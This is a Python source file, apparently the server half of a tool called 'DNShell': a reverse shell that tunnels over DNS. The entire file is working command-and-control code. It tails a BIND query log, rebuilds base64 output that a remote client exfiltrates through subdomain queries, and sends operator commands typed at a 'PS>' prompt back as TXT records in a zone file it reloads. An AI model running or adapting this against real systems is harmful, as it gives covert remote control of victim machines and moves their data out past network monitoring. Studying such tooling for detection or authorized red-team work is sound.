import subprocess
import re
import sys
import base64

print("""
     ______ _   _  _____ _          _ _ 
    |  _  \ \ | |/  ___| |        | | |
    | | | |  \| |\ `--.| |__   ___| | |
    | | | | . ` | `--. \ '_ \ / _ \ | |
    | |/ /| |\  |/\__/ / | | |  __/ | |
    |___/ \_| \_/\____/|_| |_|\___|_|_|
      """)


def base64_decode_string(encoded_string):
    decoded_bytes = base64.b64decode(encoded_string)
    decoded_string = decoded_bytes.decode('utf-8')
    return decoded_string


def base64_encode_string(string):
    encoded_bytes = base64.b64encode(string.encode("utf-8"))
    encoded_string = encoded_bytes.decode("utf-8")
    return encoded_string


logfile = "../bind/log/query.log"

with open(logfile, "w") as file:
    file.truncate()

# Define a regular expression pattern to match the log line
pattern = r"queries: client @\S+ (\d+\.\d+\.\d+\.\d+)#\d+ \((\S+)\): query: (\S+) (\S+) (\S+) \S+\ \((\d+\.\d+\.\d+\.\d+)\)"

# Start tailing the log file
p = subprocess.Popen(['tail', '-F', logfile],
                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)

data = {}

domain = "dnshell.programm.zip"


def getData(code, counter, returndata=False, returnDataAndIp=False):
    waitingfordata = True
    # Loop through the output of tail
    while waitingfordata:
        line = p.stdout.readline()
        if line:
            # Convert the line to a string using the correct encoding
            line_str = line.decode()

            # Use the regular expression pattern to extract the relevant information from the log line
            match = re.findall(pattern, line_str)
            if match:
                # Extract the information from the match
                matches = match[0]
                query = {
                    "ip_address": matches[0],
                    "domain_name": matches[1],
                    "query_class": matches[3],
                    "query_type": matches[4],
                    "domain_parts": matches[1].replace(f".revshell.{domain}", "").split(".")
                }
                if query["query_type"] == "A" and query["domain_name"].endswith(f"{code}-{counter}.revshell.{domain}"):
                    thisdata = query["domain_parts"]

                    #print(f"New query arrived from {query['ip_address']} for {query['domain_name']}, type: {query['query_type']}, class: {query['query_class']}")
                    #print(f"--- Recieved packet {thisdata[1]} of {thisdata[2]}")

                    if not thisdata[3] in data:
                        data[thisdata[3]] = {}
                    data[thisdata[3]][int(thisdata[1])
                                      ] = thisdata[0].replace("_", "=")

                    if len(data[thisdata[3]]) == int(thisdata[2]):
                        #print("--------------------- Data recieved ---------------------")
                        # Put the data together in one variable
                        datastring = ""
                        for i in range(0, int(thisdata[2])):
                            datastring += data[thisdata[3]][i]
                        #print(f"Base64: {datastring}")
                        # decode base64
                        decoded = base64_decode_string(datastring)
                        if(returnDataAndIp):
                            return decoded, query["ip_address"]
                        if(returndata):
                            return decoded
                        print(decoded)
                        waitingfordata = False

                    # else:
                        #print(f"--- Still missing {int(thisdata[2]) - len(data[thisdata[3]])} packets")

                # else:
                    #print(f"--- Ignoring query from {query['ip_address']} for {query['domain_name']}, type: {query['query_type']}, class: {query['query_class']}")
            # else:
                #print(f"No match {line_str}")


# Get Code from Client
print("Waiting for client to connect... and identify itself")
code, current_ip = getData(0, 0, True, True)
print(f"ID for this Reverse Shell: {code}")
print(f"IP of the nearest DNS: {current_ip}")

filename = f"../bind/data/zones/revshell.{domain}.zone"
preset = f"../bind/data/zones/revshell.{domain}.preset"

command = ""
counter = 0
pwd = ""
while(command != "exit"):
    command = base64_encode_string(input(f"PS {pwd}>"))

    # send command to client
    zone = open(filename, "a")
    zone.write(f"""{counter}.{code}       IN      TXT      {command}\n""")
    zone.close()

    # update zones on bind
    reloadrnc = 'docker-compose -f "../docker-compose.yml" exec bind9 rndc reload'
    subprocess.run(reloadrnc, shell=True,
                   stdout=subprocess.DEVNULL,
                   stderr=subprocess.STDOUT)

    if(command != "exit"):
        # Get response from client
        pwd = getData(f"pwd-{code}", counter, True)
        getData(f"{code}", counter)

    counter += 1
